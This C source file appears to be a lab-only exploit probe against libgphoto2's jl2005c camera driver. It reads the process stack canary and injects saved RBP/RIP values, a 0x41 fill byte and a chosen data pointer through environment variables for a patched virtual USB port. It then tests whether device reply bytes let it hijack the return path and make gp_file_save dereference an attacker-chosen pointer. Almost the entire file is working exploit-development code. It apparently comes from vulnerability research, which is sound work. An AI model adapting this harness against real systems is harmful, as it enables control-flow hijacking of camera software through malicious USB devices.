/* W171 lab-only local probe (untracked). Not part of the committed harness.
 *
 * Same victim layout as W170, but the reply is fed the REAL saved rbp and
 * saved RIP of jl2005c_init (captured by gdb at function entry and injected
 * with m2s_hexenv) instead of the finish() diversion.  If jl2005c_init then
 * returns into camera_init and gp_camera_init completes, the probe calls a
 * real gphoto2 consumer (gp_file_save) on the live CameraFile whose data
 * pointer and length were chosen by device reply bytes.  gp_file_save must
 * dereference that pointer to write the file; the file content is read back
 * and printed.
 *
 * Build against the local plain install as in victim_probe.c:
 *   P=$PWD/src/libgphoto2-2.5.34-plain/installdir-plain
 *   gcc -O0 -g -rdynamic -fno-omit-frame-pointer -I$P/include \
 *     -o live/normal_return_probe live/normal_return_probe.c \
 *     -L$P/lib -lgphoto2 -lgphoto2_port -Wl,-rpath,$P/lib
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <gphoto2/gphoto2.h>

void *m2s_victim_file;            /* looked up by the patched vusb port */

static const char m2s_marker[] = "M2SHELL_DEREF_MARKER_20261124";

static unsigned long own_canary(void)
{
	unsigned long v;
	__asm__ volatile("mov %%fs:0x28, %0" : "=r"(v));
	return v;
}

/* gdb calls this at the jl2005c_init breakpoint with the live stack values */
void m2s_hexenv(const char *name, unsigned long v)
{
	char buf[64];
	snprintf(buf, sizeof(buf), "0x%016lx", v);
	setenv(name, buf, 1);
	fprintf(stderr, "M2S_ENV %s=%s\n", name, buf);
}

static void finish(void)
{
	fprintf(stderr, "FINISH_DIVERSION_REACHED\n");
	fflush(stderr);
	_exit(3);
}

static void consume(void)
{
	const char *data = NULL;
	unsigned long size = 0;
	char path[256];
	int rc, rc2;
	FILE *f;
	char readback[128];
	size_t got;

	if (!m2s_victim_file) {
		fprintf(stderr, "CONSUMER_SKIP no victim\n");
		return;
	}
	{
		int h;
		unsigned char *hp = (unsigned char *)m2s_victim_file;
		for (h = 0x140; h < 0x190; h += 8) {
			unsigned long w = 0;
			memcpy(&w, hp + h, 8);
			fprintf(stderr, "VICTIM_AT_CONSUMER+%03x = 0x%016lx\n", h, w);
		}
	}
	rc = gp_file_get_data_and_size((CameraFile *)m2s_victim_file, &data, &size);
	fprintf(stderr, "CONSUMER_GET rc=%d data=%p size=0x%lx\n", rc,
		(void *)data, size);
	if (data && size && size < sizeof(readback)) {
		memset(readback, 0, sizeof(readback));
		memcpy(readback, data, (size_t)size);   /* dereference the chosen pointer */
		fprintf(stderr, "DEREF_READBACK bytes=%lu text=%s\n", size, readback);
	} else {
		fprintf(stderr, "DEREF_SKIP no usable pointer\n");
	}
	if (getenv("M2SHELL_TRY_SAVE")) {
		snprintf(path, sizeof(path), "/tmp/m2s-deref-%d.bin", (int)getpid());
		rc2 = gp_file_save((CameraFile *)m2s_victim_file, path);
		fprintf(stderr, "CONSUMER_SAVE rc=%d path=%s\n", rc2, path);
	}
	fflush(stderr);
}

int main(int argc, char **argv)
{
	Camera *cam = NULL;
	const char *path = argc > 1 ? argv[1] : "usb:001,001";
	int rc;

	if (!getenv("M2SHELL_JL2005_CANARY")) m2s_hexenv("M2SHELL_JL2005_CANARY", own_canary());
	if (!getenv("M2SHELL_JL2005_RIP")) m2s_hexenv("M2SHELL_JL2005_RIP", (unsigned long)(void *)&finish);
	if (!getenv("M2SHELL_JL2005_FILL")) setenv("M2SHELL_JL2005_FILL", "0x41", 1);
	if (!getenv("M2SHELL_VUSB_DATA")) m2s_hexenv("M2SHELL_VUSB_DATA", (unsigned long)(void *)m2s_marker);
	if (!getenv("M2SHELL_VUSB_SIZE")) {
		char b[32];
		snprintf(b, sizeof(b), "0x%lx", (unsigned long)strlen(m2s_marker));
		setenv("M2SHELL_VUSB_SIZE", b, 1);
	}

	if (gp_camera_new(&cam) < GP_OK) return 2;
	rc = gp_camera_init(cam, NULL);
	fprintf(stderr, "GP_CAMERA_INIT rc=%d\n", rc);
	fflush(stderr);
	if (rc < 0) return 3;
	consume();
	fprintf(stderr, "NORMAL_RETURN_COMPLETE\n");
	fflush(stderr);
	return 0;
}
